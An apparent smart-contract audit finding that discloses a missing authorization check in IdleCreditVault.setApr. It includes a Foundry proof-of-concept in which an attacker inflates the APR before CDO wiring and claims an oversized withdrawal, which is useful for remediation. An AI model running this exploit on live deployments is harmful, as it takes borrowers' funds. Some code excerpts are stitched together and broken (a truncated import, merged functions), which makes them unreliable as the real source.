### Title
Unauthenticated borrowers can rewrite credit-vault APR before CDO wiring - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.setApr` skips its CDO/manager authorization check whenever `idleCDO == address(0)`. During the deployment window between strategy initialization and `setWhitelistedCDO`, any EOA can set both `unscaledApr` and the active `lastApr` through `setAprs`, up to `maxApr`. A KYC-passing lender can then deposit, request a withdrawal priced using the attacker-controlled APR, and cause the borrower to fund an inflated withdrawal receipt at epoch stop.

### Finding Description
`setAprs` updates `unscaledApr` before delegating to `setApr`. `setApr` only enforces `msg.sender == idleCDO || msg.sender == manager` after `idleCDO` has been configured; while it is zero, all callers pass the role check and can assign any `lastApr` not exceeding `maxApr`. [1](#0-0) 

The factory explicitly calls `setAprs` before `setWhitelistedCDO`, demonstrating that this unauthenticated configuration window is part of the normal deployment sequence. [2](#0-1) 

A withdrawal request prices the receipt through `_calcInterestWithdrawRequest`, which ultimately uses `_getStrategyApr()`/`lastApr`; the resulting inflated amount is passed to `IdleCreditVault.requestWithdraw`. [3](#0-2)  The strategy records that attacker-controlled amount in `pendingWithdraws`. [4](#0-3) 

At epoch stop, the CDO pulls expected interest plus `pendingWithdraws` from the borrower and funds those receipts through `collectWithdrawFunds`. [5](#0-4)  After the epoch counter advances, the attacker calls `claimWithdrawRequest`, which pays the recorded amount without re-checking who configured the APR. [6](#0-5) 

### Impact Explanation
A KYC-passing attacker can overstate a withdrawal receipt by up to roughly the difference between the intended APR and the configured APR over one epoch, capped by `DEFAULT_MAX_APR` at 20% annualized. For a 30-day epoch and principal `P`, setting the APR from an intended 10% to 20% creates approximately `P * 10% * 30 / 365` of excess borrower-funded claim value before fees. If the borrower’s allowance covers only the contractual amount, the inflated pull instead fails and triggers the default path; if the operational allowance covers the inflated amount, the excess is directly paid to the attacker. This breaks fair withdrawal pricing and the solvency invariant that pending receipts represent principal plus only the protocol-approved APR.

### Likelihood Explanation
The attack requires the deployment/configuration race in which `idleCDO` is still zero. That window is real because APR configuration is intentionally performed before CDO whitelisting. No private key, privileged role, oracle manipulation, or malicious borrower is required: the caller only needs to send one transaction during setup and later use normal lender flows. The required KYC/deposit capability limits the attacker set, but those users are explicitly untrusted protocol participants.

### Recommendation
Do not skip authorization when `idleCDO` is unset. Before CDO wiring, restrict `setApr`, `setAprs`, and `setAprsWithBuffer` to `owner()` or `manager`; after wiring, keep the current CDO-or-manager rule. Prefer configuring `idleCDO` atomically during initialization, or add an explicit one-time setup phase that is closed by `setWhitelistedCDO`. `setWhitelistedCDO` should also verify the APR values expected by the deployer.

import {TransparentUpgradeableProxy} from

contract UnauthorizedAprSetupPoC is Test {
  address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  function test_UnauthenticatedAprInflatesWithdrawalReceipt() external {
    vm.createSelectFork("mainnet");

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker");
    address proxyAdmin = makeAddr("proxyAdmin");

    IERC20Detailed underlying = IERC20Detailed(USDC);

    IdleCreditVault strategyImpl = new IdleCreditVault();
    IdleCreditVault strategy = IdleCreditVault(address(
      new TransparentUpgradeableProxy(
        address(strategyImpl),
        proxyAdmin,
        abi.encodeWithSelector(
          IdleCreditVault.initialize.selector,
          USDC,
          owner,
          manager,
          borrower,
          "Borrower",
          10e18 // intended APR: 10%
        )
      )
    ));

    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(address(
      new TransparentUpgradeableProxy(
        address(cdoImpl),
        proxyAdmin,
        abi.encodeWithSelector(
          IdleCDOCreditVault.initialize.selector,
          0,
          USDC,
          owner,
          owner,
          address(0),
          address(strategy),
          100_000
        )
      )
    ));

    // Authorization is skipped because strategy.idleCDO() is still zero.
    assertEq(strategy.idleCDO(), address(0));
    vm.prank(attacker);
    strategy.setAprs(20e18, 20e18);

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    vm.prank(owner);
    cdo.setKeyringParams(address(0), 0);
    vm.prank(owner);
    cdo.setFeeParams(owner, 0, 0, 0);

    uint256 principal = 1_000_000e6;
    deal(USDC, attacker, principal);
    vm.startPrank(attacker);
    underlying.approve(address(cdo), principal);
    uint256 trancheAmount = cdo.depositAA(principal);
    uint256 receipt = cdo.requestWithdraw(trancheAmount, cdo.AATranche());
    vm.stopPrank();

    assertGt(receipt, principal);

    // Honest operational approval is sufficient for the CDO to fund the receipt.
    uint256 expected = cdo.expectedEpochInterest() + strategy.pendingWithdraws();
    deal(USDC, borrower, expected);
    vm.prank(borrower);
    underlying.approve(address(cdo), expected);

    vm.prank(owner);
    cdo.startEpoch();
    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(owner);
    cdo.stopEpoch(10e18, 0);

    uint256 balanceBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdo.claimWithdrawRequest();

    // The payout uses the attacker's 20% APR rather than the intended 10% APR.
    assertEq(underlying.balanceOf(attacker) - balanceBefore, receipt);
    assertGt(receipt, principal + principal * 10e18 / 100 * 30 days / 365 days / 1e18 - 1);
  }
}

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches

    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
